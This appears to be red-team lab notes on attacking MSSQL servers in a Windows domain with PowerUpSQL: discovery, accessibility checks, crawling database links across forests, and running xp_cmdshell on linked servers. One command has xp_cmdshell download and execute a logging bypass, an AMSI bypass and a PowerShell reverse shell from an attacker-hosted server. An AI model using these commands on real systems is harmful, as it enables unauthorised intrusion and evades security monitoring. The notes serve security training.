
# **MSSQL Servers**



- MS SQL servers are generally deployed in plenty in a Windows domain.
- SQL Servers provide very good options for lateral movement as domain users can be mapped to database roles.
- For MSSQL and PowerShell hackery, lets use PowerUpSQL
https://github.com/NetSPI/PowerUpSQL



**_Examples_**


- Discovery (SPN Scanning)

```powershell
Get-SQLInstanceDomain
```

- Check Accessibility

```powershell
Get-SQLConnectionTestThreaded

Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```


![](https://i.imgur.com/GvA1sd2.png)


- Gather Information

```powershell
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```


![](https://i.imgur.com/9SWwFqr.png)



> After running the above command and you see that the `ISSysadmin` option is set to **No**, as an attacker, you shouldn't loose interest because we can still extract information






# **MSSQL Servers - Database Links**


- A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources.
- In case of database links between SQL servers, that is, linked SQL servers it is possible to execute stored procedures. 
- Database links work even across forest trusts.



![](https://i.imgur.com/A5hBH7R.png)



**_Examples_**


- Searching Database Links
- Look for links to remote servers

```powershell
Get-SQLServerLink -Instance dcorp-mssql -Verbose
```

OR

```powershell
select * from master..sysservers
```



![](https://i.imgur.com/sK1jStA.png)


> Data is accessible via the `DCORP-SQL1` link, this is what we want


- Enumerating Database Links


```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose
```




![](https://i.imgur.com/xr7rwLQ.png)



- Executing Commands
- Use the `-QuertyTarget` parameter to run Query on a specific instance (without `-QueryTarget` the command tries to use `xp_cmdshell` on every link of the chain)


```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget eu-sql
```



![](https://i.imgur.com/AhAmeLt.png)



- Gain reverse shell instead of RCE


```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.1/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.1/amsibypass.txt);iex (iwr -UseBasicParsing http://172.1 6.100.1/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sql
```


> Make sure to start your **HTTP FIle Server (HFS)** first and upload the file `sbloggingbypass.txt`, `amsibypass.txt` and `Invoke-PowerShellTcpEx.ps1` in other to host them




# **Learning Objective**


- Get a reverse shell on a SQL server in eurocorp forest by abusing database links from dcorp-mssql.


## **Solution**

**_Coming Soon_**


# **References**


- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/abusing-ad-mssql
- https://www.powershellgallery.com/



